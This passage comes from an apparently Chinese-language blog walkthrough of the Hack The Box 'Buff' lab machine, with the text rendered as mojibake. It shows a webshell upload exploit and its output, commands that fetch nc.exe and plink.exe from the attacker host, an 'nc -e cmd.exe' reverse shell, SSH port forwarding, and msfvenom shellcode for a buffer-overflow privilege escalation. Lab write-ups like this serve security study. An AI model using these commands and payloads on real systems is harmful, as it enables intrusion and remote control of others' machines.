class="string">&#x27;upload&#x27;</span>&#125;</span><br><span class="line">    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)</span><br><span class="line">    webshell(SERVER_URL, s)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-exploit"><a href="#0x04-exploit" class="headerlink" title="0x04.exploit"></a>0x04.exploit</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># python2 gymrce.py http://10.10.10.198:8080/</span></span><br><span class="line">            /\</span><br><span class="line">/vvvvvvvvvvvv \--------------------------------------,</span><br><span class="line">`^^^^^^^^^^^^ /============BOKU=====================<span class="string">&quot;</span></span><br><span class="line"><span class="string">            \/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Successfully connected to webshell.</span></span><br><span class="line"><span class="string">C:\xampp\htdocs\gym\upload&gt; </span></span><br><span class="line"><span class="string">C:\xampp\htdocs\gym\upload&gt; whoami</span></span><br><span class="line"><span class="string">ï¿½PNG</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buff\shaun</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\xampp\htdocs\gym\upload&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x05-éªŒè¯"><a href="#0x05-éªŒè¯" class="headerlink" title="0x05.éªŒè¯"></a>0x05.éªŒè¯</h2><blockquote>
<p>åˆ©ç”¨å®Œæˆå°±å¯ä»¥ä½¿ç”¨å¸¦æœ‰telepathyå‚æ•°çš„GETè¯·æ±‚ï¼Œä¸ä½äºâ€™/upload.php?id=kamehamehaâ€™çš„webshellè¿›è¡Œé€šä¿¡ã€‚</p>
</blockquote>
<img src="/2020/09/01/HTB-buff/image-20200901153655031.png" class>

<h2 id="0x06-åå¼¹shell"><a href="#0x06-åå¼¹shell" class="headerlink" title="0x06.åå¼¹shell"></a>0x06.åå¼¹shell</h2><p><code>ä¸Šä¼ nc.exe</code></p>
<blockquote>
<p><span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjE5ODo4MDgwL3VwbG9hZC9rYW1laGFtZWhhLnBocD90ZWxlcGF0aHk9Y3VybA==">http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl<i class="fa fa-external-link-alt"></i></span> -O <span class="exturl" data-url="aHR0cDovLzEwLjEwLjE3LjIxNi9uYy5leGU=">http://10.10.17.216/nc.exe<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># cp /usr/share/windows-binaries/nc.exe ./htb/buff/</span></span><br><span class="line">root@JIYE:~<span class="comment"># cd htb/buff/</span></span><br><span class="line">root@JIYE:~/htb/buff<span class="comment"># ls</span></span><br><span class="line">gymrce.py  nc.exe  nmap.CVT</span><br><span class="line">root@JIYE:~/htb/buff<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2020/09/01/HTB-buff/image-20200901200724402.png" class>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.198 - - [01/Sep/2020 03:53:36] <span class="string">&quot;GET /nc.exe HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>kaliç›‘å¬</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>åå¼¹</code></p>
<blockquote>
<p><span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjE5ODo4MDgwL3VwbG9hZC9rYW1laGFtZWhhLnBocD90ZWxlcGF0aHk9bmM=">http://10.10.10.198:8080/upload/kamehameha.php?telepathy=nc<i class="fa fa-external-link-alt"></i></span> -e cmd.exe 10.10.17.216 6666</p>
</blockquote>
<img src="/2020/09/01/HTB-buff/image-20200901155912608.png" class>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.198] 51130</span><br><span class="line">Microsoft Windows [Version 10.0.17134.1610]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">buff\shaun</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;<span class="built_in">cd</span>\</span><br></pre></td></tr></table></figure>

<p><code>æ‰¾åˆ°user.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\shaun\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A22D-49F7</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\shaun\Desktop</span><br><span class="line"></span><br><span class="line">14/07/2020  13:27    &lt;DIR&gt;          .</span><br><span class="line">14/07/2020  13:27    &lt;DIR&gt;          ..</span><br><span class="line">01/09/2020  07:25                34 user.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   8,142,823,424 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\shaun\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">*********************************</span><br></pre></td></tr></table></figure>

<h2 id="0x07-ææƒ"><a href="#0x07-ææƒ" class="headerlink" title="0x07.ææƒ"></a>0x07.ææƒ</h2><p><code>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶ï¼Œå‘ç°å¥½å¤š&quot;å‰è¾ˆ&quot;ä¸Šä¼ çš„æ–‡ä»¶ğŸ˜‚</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A22D-49F7</span><br><span class="line"></span><br><span class="line"> Directory of C:\xampp\htdocs\gym\upload</span><br><span class="line"></span><br><span class="line">01/09/2020  08:55    &lt;DIR&gt;          .</span><br><span class="line">01/09/2020  08:55    &lt;DIR&gt;          ..</span><br><span class="line">01/09/2020  07:52         7,481,344 chisel.exe</span><br><span class="line">01/09/2020  08:33                53 kamehameha.php</span><br><span class="line">21/08/2017  14:40            59,392 nc.exe</span><br><span class="line">01/09/2020  08:54            59,392 ncat.exe</span><br><span class="line">01/09/2020  08:55           311,296 p1ink.exe</span><br><span class="line">21/08/2017  14:40           311,296 plink.exe</span><br><span class="line">01/09/2020  08:39                47 shell.php</span><br><span class="line">               7 File(s)      8,222,820 bytes</span><br><span class="line">               2 Dir(s)   8,263,647,232 bytes free</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure>

<p><code>ä¸Šä¼ plink</code></p>
<blockquote>
<p>Plinkæ˜¯Windowså‘½ä»¤è¡ŒSSHå®¢æˆ·ç«¯ï¼Œplinkæ˜¯sshåè®®çš„ä¸€ä¸ªå®ç°ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># cp /usr/share/windows-binaries/plink.exe ./htb/buff/</span></span><br><span class="line">root@JIYE:~<span class="comment">#root@JIYE:~/htb/buff# ls</span></span><br><span class="line">flag  gymrce.py  nc.exe  nmap.CVT  plink.exe</span><br><span class="line">root@JIYE:~/htb/buff<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.198 - - [01/Sep/2020 04:35:27] <span class="string">&quot;GET /plink.exe HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjE5ODo4MDgwL3VwbG9hZC9rYW1laGFtZWhhLnBocD90ZWxlcGF0aHk9Y3VybA==">http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovLzEwLjEwLjE3LjIxNi9wbGluay5leGU=">http://10.10.17.216/plink.exe<i class="fa fa-external-link-alt"></i></span> -o plink_f.exe</p>
</blockquote>
<img src="/2020/09/01/HTB-buff/image-20200901163645906.png" class>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is A22D-49F7</span><br><span class="line"></span><br><span class="line"> Directory of C:\xampp\htdocs\gym\upload</span><br><span class="line"></span><br><span class="line">01/09/2020  09:37    &lt;DIR&gt;          .</span><br><span class="line">01/09/2020  09:37    &lt;DIR&gt;          ..</span><br><span class="line">01/09/2020  07:52         7,481,344 chisel.exe</span><br><span class="line">01/09/2020  09:33                53 kamehameha.php</span><br><span class="line">21/08/2017  14:40            59,392 nc.exe</span><br><span class="line">01/09/2020  08:54            59,392 ncat.exe</span><br><span class="line">01/09/2020  08:55           311,296 p1ink.exe</span><br><span class="line">21/08/2017  14:40           311,296 plink.exe</span><br><span class="line">01/09/2020  09:37           311,296 plink_f.exe</span><br><span class="line">01/09/2020  08:39                47 shell.php</span><br><span class="line">               8 File(s)      8,534,116 bytes</span><br><span class="line">               2 Dir(s)   8,604,606,464 bytes free</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹ç³»ç»Ÿæ¶æ„ï¼Œç»“æœä¸º64ä½</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;systeminfo   </span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 BUFF</span><br><span class="line">OS Name:                   Microsoft Windows 10 Enterprise</span><br><span class="line">OS Version:                10.0.17134 N/A Build 17134</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          shaun</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00329-10280-00000-AA218</span><br><span class="line">Original Install Date:     16/06/2020, 15:05:58</span><br><span class="line">System Boot Time:          01/09/2020, 10:57:29</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19/06/2019</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume2</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-gb;English (United Kingdom)</span><br><span class="line">Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London</span><br><span class="line">Total Physical Memory:     4,095 MB</span><br><span class="line">Available Physical Memory: 2,240 MB</span><br><span class="line">Virtual Memory: Max Size:  4,799 MB</span><br><span class="line">Virtual Memory: Available: 2,325 MB</span><br><span class="line">Virtual Memory: In Use:    2,474 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    WORKGROUP</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.198</span><br><span class="line">                                 [02]: fe80::fc70:a698:752c:f5c3</span><br><span class="line">                                 [03]: dead:beef::9007:7d8e:af8f:9419</span><br><span class="line">                                 [04]: dead:beef::fc70:a698:752c:f5c3</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure>

<p><code>æœ¬æ¥æƒ³ä¸Šä¼ ä¸ªwinPEASx64.exeæ‰«æå¯ä»¥ç”¨æ¥ææƒçš„ç¨‹åºï¼Œéœ¸ç‰¹ä¸èƒ½æ‰§è¡Œã€‚ã€‚</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line">    Directory: C:\xampp\htdocs\gym\upload</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name                               </span><br><span class="line">----                -------------         ------ ----                               </span><br><span class="line">-a----       01/09/2020     14:32             53 kamehameha.php                    </span><br><span class="line">-a----       01/09/2020     11:01          59392 nc.exe                             </span><br><span class="line">-a----       01/09/2020     14:12          38616 nc1.exe                             </span><br><span class="line">-a----       01/09/2020     12:48              0 pe.exe                             </span><br><span class="line">-a----       01/09/2020     11:01         311296 plink.exe                           </span><br><span class="line">-a----       01/09/2020     12:17              5 start</span><br><span class="line">-a----       01/09/2020     12:17              5 status                             </span><br><span class="line">-a----       01/09/2020     14:16            400 winP                               </span><br><span class="line">-a----       01/09/2020     14:19          33057 winP.bat                           </span><br><span class="line">-a----       01/09/2020     14:16            400 winP.exe                           </span><br><span class="line">-a----       01/09/2020     13:16         279987 winPEAS.bat                         </span><br><span class="line">-a----       01/09/2020     13:05          87839 winPEASany.exe                     </span><br><span class="line">-a----       01/09/2020     12:45              0 winPEASexe                         </span><br><span class="line">-a----       01/09/2020     13:10          87839 winPEASx64.exe                     </span><br><span class="line">PS C:\xamp\htdocs\gym\upload&gt; </span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹ç«¯å£æš‚ç”¨æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°8888è¢«ç›‘å¬</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;netstat -nao | findstr <span class="string">&quot;8888&quot;</span></span><br><span class="line">netstat -nao | findstr <span class="string">&quot;8888&quot;</span></span><br><span class="line">  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       5828</span><br><span class="line"></span><br><span class="line">C:\xampp\htdocs\gym\upload&gt;</span><br></pre></td></tr></table></figure>

<p><code>ä½¿ç”¨plinkè¿›è¡Œç«¯å£è½¬å‘ï¼Œéœ¸ç‰¹å¤±è´¥äº†ï¼Œä¸ªäººçŒœæµ‹æ˜¯é˜²ç«å¢™çš„åŸå› ã€‚</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æŠ¥é”™ä¸ºï¼šæ— æ³•åŒæ„å¯†é’¥äº¤æ¢ç®—æ³•</p>
<p>Googleä¸€ä¸‹å‘ç°éœ€è¦æ›´æ–°puttyï¼Œä½†æ˜¯æ›´æ–°åè¿˜æ˜¯ä¸å¥½ä½¿ã€‚ã€‚ã€‚èœç‹—ä¸€è„¸èŒ«ç„¶ï¼</p>
<p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw â€œrootâ€ -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjMTExOyYjeDZmOyYjeDc0OyYjeDQwOyYjNDk7JiN4MzA7JiM0NjsmIzQ5OyYjNDg7JiM0NjsmI3gzMTsmIzU1OyYjNDY7JiN4MzI7JiN4MzE7JiM1NDs=">&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#x30;&#46;&#49;&#48;&#46;&#x31;&#55;&#46;&#x32;&#x31;&#54;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw â€œrootâ€ -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjeDZmOyYjMTExOyYjMTE2OyYjNjQ7JiN4MzE7JiN4MzA7JiN4MmU7JiN4MzE7JiN4MzA7JiN4MmU7JiN4MzE7JiM1NTsmIzQ2OyYjeDMyOyYjNDk7JiM1NDs=">&#114;&#x6f;&#111;&#116;&#64;&#x31;&#x30;&#x2e;&#x31;&#x30;&#x2e;&#x31;&#55;&#46;&#x32;&#49;&#54;<i class="fa fa-external-link-alt"></i></span><br>Looking up host â€œ10.10.17.216â€<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldnâ€™t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjeDYzOyYjeDc1OyYjMTE0OyYjMTE4OyYjeDY1OyYjeDMyOyYjNTM7JiN4MzU7JiM0OTsmIzU3OyYjNDU7JiN4NzM7JiN4Njg7JiN4NjE7JiN4MzI7JiN4MzU7JiM1NDsmIzY0OyYjeDZjOyYjeDY5OyYjOTg7JiN4NzM7JiMxMTU7JiMxMDQ7JiM0NjsmIzExMTsmIzExNDsmI3g2Nzs=">&#x63;&#x75;&#114;&#118;&#x65;&#x32;&#53;&#x35;&#49;&#57;&#45;&#x73;&#x68;&#x61;&#x32;&#x35;&#54;&#64;&#x6c;&#x69;&#98;&#x73;&#115;&#104;&#46;&#111;&#114;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldnâ€™t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiMxMTc7JiN4NzI7JiN4NzY7JiMxMDE7JiM1MDsmI3gzNTsmIzUzOyYjeDMxOyYjeDM5OyYjeDJkOyYjeDczOyYjMTA0OyYjOTc7JiM1MDsmI3gzNTsmIzU0OyYjeDQwOyYjeDZjOyYjMTA1OyYjeDYyOyYjeDczOyYjeDczOyYjeDY4OyYjNDY7JiN4NmY7JiMxMTQ7JiMxMDM7">&#99;&#117;&#x72;&#x76;&#101;&#50;&#x35;&#53;&#x31;&#x39;&#x2d;&#x73;&#104;&#97;&#50;&#x35;&#54;&#x40;&#x6c;&#105;&#x62;&#x73;&#x73;&#x68;&#46;&#x6f;&#114;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p>
</blockquote>
<p><code>ç¬¬äºŒå¤©æˆ‘åˆæ¥äº†ï¼Œè¿™å›æˆåŠŸäº†ï¼ï¼Œè¿™å›æ¢æˆäº†powershellã€‚</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; .\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">.\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">Looking up host <span class="string">&quot;10.10.17.216&quot;</span> <span class="keyword">for</span> SSH connection</span><br><span class="line">Connecting to 10.10.17.216 port 22</span><br><span class="line">We claim version: SSH-2.0-PuTTY_Release_0.74</span><br><span class="line">Remote version: SSH-2.0-OpenSSH_8.3p1 Debian-1</span><br><span class="line">Using SSH protocol version 2</span><br><span class="line">Doing ECDH key exchange with curve Curve25519 and <span class="built_in">hash</span> SHA-256 (SHA-NI accelerated)</span><br><span class="line">Server also has ecdsa-sha2-nistp256/ssh-rsa host keys, but we don<span class="string">&#x27;t know any of them</span></span><br><span class="line"><span class="string">Host key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">The server&#x27;</span>s host key is not cached <span class="keyword">in</span> the registry. You</span><br><span class="line">have no guarantee that the server is the computer you</span><br><span class="line">think it is.</span><br><span class="line">The server<span class="string">&#x27;s ssh-ed25519 key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">If you trust this host, enter &quot;y&quot; to add the key to</span></span><br><span class="line"><span class="string">PuTTY&#x27;</span>s cache and carry on connecting.</span><br><span class="line">If you want to carry on connecting just once, without</span><br><span class="line">adding the key to the cache, enter <span class="string">&quot;n&quot;</span>.</span><br><span class="line">If you <span class="keyword">do</span> not trust this host, press Return to abandon the</span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) outbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) outbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) compression after user authentication</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) inbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) inbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) decompression after user authentication</span><br><span class="line">Using username <span class="string">&quot;root&quot;</span>.</span><br><span class="line">Sent password</span><br><span class="line">Initialised delayed zlib (RFC1950) decompression</span><br><span class="line">Initialised delayed zlib (RFC1950) compression</span><br><span class="line">Access granted</span><br><span class="line">Requesting remote port 8888 forward to 127.0.0.1:8888</span><br><span class="line">Opening main session channel</span><br><span class="line">Remote port forwarding from 8888 enabled</span><br><span class="line">Opened main channel</span><br><span class="line">Started a shell/<span class="built_in">command</span></span><br><span class="line">Linux JIYE 5.7.0-kali1-amd64 <span class="comment">#1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">ls</span><br><span class="line">arachni</span><br><span class="line">cacert.der</span><br><span class="line">clash</span><br><span class="line">CS4.0</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">get-pip.py</span><br><span class="line">htb</span><br><span class="line">Lluna.ovpn</span><br><span class="line">Lluna.ovpn.bak</span><br><span class="line">Music</span><br><span class="line">Pictures</span><br><span class="line">Public</span><br><span class="line">python_shell</span><br><span class="line">Templates</span><br><span class="line">Videos</span><br><span class="line">vulnhub</span><br></pre></td></tr></table></figure>

<p><code>ä¸‹é¢ç”¨Buffer Overflow æ¥ææƒ</code><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDgzODk=">URL<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>ä½¿ç”¨msfvenomç”Ÿæˆshellcodeæ›¿æ¢åŸæ¥çš„</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># msfvenom -p windows/exec CMD=&#x27;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.17.216 7078&#x27; -b &#x27;\x00\x0A\x0D&#x27; -f python -v payload</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 274 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 274</span><br><span class="line">Payload size: 274 bytes</span><br><span class="line">Final size of python file: 1456 bytes</span><br><span class="line">payload =  b<span class="string">&quot;&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xba\xd7\xda\x14\xc1\xdb\xcd\xd9\x74\x24\xf4\x58&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x31\xc9\xb1\x3e\x31\x50\x15\x83\xc0\x04\x03\x50&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x11\xe2\x22\x26\xfc\x43\xcc\xd7\xfd\x23\x45\x32&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xcc\x63\x31\x36\x7f\x54\x32\x1a\x8c\x1f\x16\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x07\x6d\xbe\xa0\xa0\xd8\x98\x8f\x31\x70\xd8\x8e&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xb1\x8b\x0c\x71\x8b\x43\x41\x70\xcc\xbe\xab\x20&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x85\xb5\x19\xd5\xa2\x80\xa1\x5e\xf8\x05\xa1\x83&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x49\x27\x80\x15\xc1\x7e\x02\x97\x06\x0b\x0b\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4b\x36\xc2\x24\xbf\xcc\xd5\xec\xf1\x2d\x79\xd1&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x3d\xdc\x80\x15\xf9\x3f\xf7\x6f\xf9\xc2\x0f\xb4&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x83\x18\x9a\x2f\x23\xea\x3c\x94\xd5\x3f\xda\x5f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xd9\xf4\xa9\x38\xfe\x0b\x7e\x33\xfa\x80\x81\x94&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x8a\xd3\xa5\x30\xd6\x80\xc4\x61\xb2\x67\xf9\x72&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x1d\xd7\x5f\xf8\xb0\x0c\xd2\xa3\xde\xd3\x61\xde&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xad\xd4\x79\xe1\x81\xbc\x48\x6a\x4e\xba\x55\xb9&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x2a\x34\x1c\xe0\x1b\xdd\xf8\x70\x1e\x80\xfb\xae&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x5d\xbd\x7f\x5b\x1e\x3a\x9f\x2e\x1b\x06\x18\xc2&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x51\x17\xcc\xe4\xc6\x18\xc5\xa6\xd2\xba\x9d\x49&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4e\x33\x2d\xd6\xf8\xc7\xa9\x89\x9b\x54\x6d\x31&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x25\xf6\xd1\xc8\xa5\x64\x86\x53\x22\x29\x36\xf7&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x84\xb4\xbe\x92\xf8\x1b\x5b\x7d\x9a\x0e\xc7\x53&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x39\xa9\x62\x8c\xf0\x79\x42\xfd\xc2\x57\xab\xca&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x0c\x9a\xfa\x02\x71\xed\xcc\x5d\x49\x11&quot;</span></span><br><span class="line">root@JIYE:~/htb/buff<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>ç¼–è¾‘payload</code></p>
